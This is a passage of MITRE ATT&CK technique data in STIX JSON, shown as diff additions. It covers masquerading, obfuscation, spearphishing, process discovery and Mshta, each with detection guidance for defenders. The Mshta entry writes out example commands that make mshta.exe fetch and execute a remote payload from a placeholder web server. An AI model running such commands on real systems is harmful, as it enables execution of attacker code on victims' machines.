+            "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Yossi Weizman, Azure Defender Research Team",
+                "Vishwas Manral, McAfee"
+            ],
+            "x_mitre_detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1036/005",
+                    "external_id": "T1036.005",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/177.html",
+                    "external_id": "CAPEC-177",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
+                    "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
+                    "source_name": "Elastic Masquerade Ball"
+                },
+                {
+                    "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
+                    "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
+                    "source_name": "Twitter ItsReallyNick Masquerading Update"
+                },
+                {
+                    "url": "https://docs.docker.com/engine/reference/commandline/images/",
+                    "description": "Docker. (n.d.). Docker Images. Retrieved April 6, 2021.",
+                    "source_name": "Docker Images"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Obfuscated Files or Information",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "File: File Metadata",
+                "File: File Creation",
+                "Process: Process Creation"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-10-20T16:33:13.472Z",
+            "created": "2017-05-31T21:30:32.662Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_defense_bypassed": [
+                "Host forensic analysis",
+                "Signature-based detection",
+                "Host intrusion prevention systems",
+                "Application control",
+                "Log analysis",
+                "Application control by file name or path"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
+            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
+            "x_mitre_contributors": [
+                "Red Canary",
+                "Christiaan Beek, @ChristiaanBeek"
+            ],
+            "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1027",
+                    "external_id": "T1027",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/267.html",
+                    "external_id": "CAPEC-267",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "Volexity PowerDuke November 2016",
+                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
+                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+                },
+                {
+                    "source_name": "Linux/Cdorked.A We Live Security Analysis",
+                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
+                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
+                },
+                {
+                    "source_name": "Carbon Black Obfuscation Sept 2016",
+                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
+                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
+                },
+                {
+                    "source_name": "FireEye Obfuscation June 2017",
+                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
+                },
+                {
+                    "source_name": "FireEye Revoke-Obfuscation July 2017",
+                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
+                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
+                },
+                {
+                    "source_name": "PaloAlto EncodedCommand March 2017",
+                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
+                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
+                },
+                {
+                    "source_name": "GitHub Revoke-Obfuscation",
+                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
+                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
+                },
+                {
+                    "source_name": "GitHub Office-Crackros Aug 2016",
+                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
+                    "url": "https://github.com/itsreallynick/office-crackros"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-10-18T17:39:12.452Z",
+            "name": "Spearphishing Attachment",
+            "x_mitre_data_sources": [
+                "File: File Creation",
+                "Application Log: Application Log Content",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_version": "2.2",
+            "created": "2020-03-02T19:05:18.137Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "initial-access"
+                }
+            ],
+            "x_mitre_platforms": [
+                "macOS",
+                "Windows",
+                "Linux"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
+            "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Philip Winther"
+            ],
+            "x_mitre_detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1566/001",
+                    "external_id": "T1566.001",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/163.html",
+                    "external_id": "CAPEC-163",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
+                    "source_name": "Microsoft Anti Spoofing"
+                },
+                {
+                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
+                    "source_name": "ACSC Email Spoofing"
+                },
+                {
+                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
+                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
+                    "source_name": "Elastic - Koadiac Detection with EQL"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Spearphishing Link",
+            "x_mitre_data_sources": [
+                "Application Log: Application Log Content",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_version": "2.1",
+            "modified": "2021-04-14T14:38:42.715Z",
+            "created": "2020-03-02T19:15:44.182Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "initial-access"
+                }
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Office 365",
+                "SaaS",
+                "Google Workspace"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
+            "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
+            "x_mitre_contributors": [
+                "Philip Winther",
+                "Shailesh Tiwary (Indian Army)",
+                "Mark Wee",
+                "Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)",
+                "Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)"
+            ],
+            "x_mitre_detection": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1566/002",
+                    "external_id": "T1566.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/163.html",
+                    "external_id": "CAPEC-163",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks",
+                    "description": "Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.",
+                    "source_name": "Trend Micro Pawn Storm OAuth 2017"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
+                    "source_name": "Microsoft Anti Spoofing"
+                },
+                {
+                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
+                    "source_name": "ACSC Email Spoofing"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Spearphishing Attachment",
+            "x_mitre_data_sources": [
+                "Application Log: Application Log Content",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-04-15T03:41:33.335Z",
+            "created": "2020-10-02T17:08:57.386Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "reconnaissance"
+                }
+            ],
+            "x_mitre_platforms": [
+                "PRE"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc",
+            "description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
+            "x_mitre_contributors": [
+                "Philip Winther",
+                "Sebastian Salla, McAfee",
+                "Robert Simmons, @MalwareUtkonos"
+            ],
+            "x_mitre_detection": "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1598/002",
+                    "external_id": "T1598.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/",
+                    "description": "Ducklin, P. (2020, October 2). Serious Security: Phishing without links \u2013 when phishers bring along their own web pages. Retrieved October 20, 2020.",
+                    "source_name": "Sophos Attachment"
+                },
+                {
+                    "url": "https://github.com/ryhanson/phishery",
+                    "description": "Ryan Hanson. (2016, September 24). phishery. Retrieved October 23, 2020.",
+                    "source_name": "GitHub Phishery"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
+                    "source_name": "Microsoft Anti Spoofing"
+                },
+                {
+                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
+                    "source_name": "ACSC Email Spoofing"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Spearphishing Link",
+            "x_mitre_data_sources": [
+                "Application Log: Application Log Content",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-04-15T03:42:26.537Z",
+            "created": "2020-10-02T17:09:50.723Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "reconnaissance"
+                }
+            ],
+            "x_mitre_platforms": [
+                "PRE"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
+            "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
+            "x_mitre_contributors": [
+                "Philip Winther",
+                "Sebastian Salla, McAfee",
+                "Robert Simmons, @MalwareUtkonos"
+            ],
+            "x_mitre_detection": "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nMonitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1598/003",
+                    "external_id": "T1598.003",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html",
+                    "description": "Babon, P. (2020, September 3). Tricky 'Forms' of Phishing. Retrieved October 20, 2020.",
+                    "source_name": "TrendMictro Phishing"
+                },
+                {
+                    "url": "https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages",
+                    "description": "Kan, M. (2019, October 24). Hackers Try to Phish United Nations Staffers With Fake Login Pages. Retrieved October 20, 2020.",
+                    "source_name": "PCMag FakeLogin"
+                },
+                {
+                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
+                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
+                    "source_name": "Microsoft Anti Spoofing"
+                },
+                {
+                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
+                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
+                    "source_name": "ACSC Email Spoofing"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Process Discovery",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1057",
+                    "external_id": "T1057",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/573.html",
+                    "external_id": "CAPEC-573",
+                    "source_name": "capec"
+                }
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2020-03-26T18:05:53.130Z",
+            "x_mitre_system_requirements": [
+                "Administrator, SYSTEM may provide better process ownership details"
+            ],
+            "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator",
+                "SYSTEM"
+            ],
+            "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created": "2017-05-31T21:30:48.728Z",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Mshta",
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation",
+                "Command: Command Execution",
+                "Network Traffic: Network Connection Creation"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-15T23:59:00.395Z",
+            "created": "2020-01-23T19:32:49.557Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+            "x_mitre_defense_bypassed": [
+                "Application control",
+                "Digital Certificate Validation"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+            "x_mitre_contributors": [
+                "@ionstorm",
+                "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
+                "Ricardo Dias"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1218/005",
+                    "external_id": "T1218.005",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf",
+                    "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.",
+                    "source_name": "Cylance Dust Storm"
+                },
+                {
+                    "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
+                    "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+                    "source_name": "Red Canary HTA Abuse Part Deux"
+                },
+                {
+                    "source_name": "FireEye Attacks Leveraging HTA",
